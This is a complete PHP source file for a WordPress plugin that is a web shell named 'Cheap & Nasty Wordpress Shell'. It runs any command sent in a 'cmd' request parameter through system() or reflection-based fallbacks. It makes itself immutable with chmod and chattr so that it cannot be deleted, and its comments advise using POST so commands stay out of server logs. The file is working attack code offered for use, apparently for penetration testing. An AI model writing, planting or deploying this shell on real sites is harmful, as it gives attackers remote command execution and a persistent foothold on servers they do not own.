<?php
    /*
    Plugin Name: Cheap & Nasty Wordpress Shell
    Plugin URI: https://github.com/leonjza/wordpress-shell
    Description: Execute Commands as the webserver you are serving wordpress with! Shell will probably live at /wp-content/plugins/shell/shell.php. Commands can be given using the 'cmd' GET parameter. Eg: "http://192.168.0.1/wp-content/plugins/shell/shell.php?cmd=id", should provide you with output such as <code>uid=33(www-data) gid=verd33(www-data) groups=33(www-data)</code>
    Author: Leon Jacobs
    Version: 0.2
    Author URI: https://leonjza.github.io
    */

# attempt to protect myself from deletion
$this_file = __FILE__;
@system("chmod ugo-w $this_file");
@system("chattr +i $this_file");

# Name of the parameter (GET or POST) for the command. Change this if the target already use this parameter.
$cmd = 'cmd';

# test if parameter 'cmd' is present. If not this will avoid an error on logs or on all pages if badly configured.
if(isset($_REQUEST[$cmd])) {

    # grab the command we want to run from the 'cmd' GET or POST parameter (POST don't display the command on apache logs)
    $command = $_REQUEST[$cmd];

    # Try to find a way to run our command using various PHP internals
    if (class_exists('ReflectionFunction')) {

       # http://php.net/manual/en/class.reflectionfunction.php
       $function = new ReflectionFunction('system');
       $function->invoke($command);

    } elseif (function_exists('call_user_func_array')) {

       # http://php.net/manual/en/function.call-user-func-array.php
       call_user_func_array('system', array($command));

    } elseif (function_exists('call_user_func')) {

       # http://php.net/manual/en/function.call-user-func.php
       call_user_func('system', $command);

    } else {

       # this is the last resort. chances are PHP Suhosin
       # has system() on a blacklist anyways :>

       # http://php.net/manual/en/function.system.php
       system($command);
    }
    
    die();
}
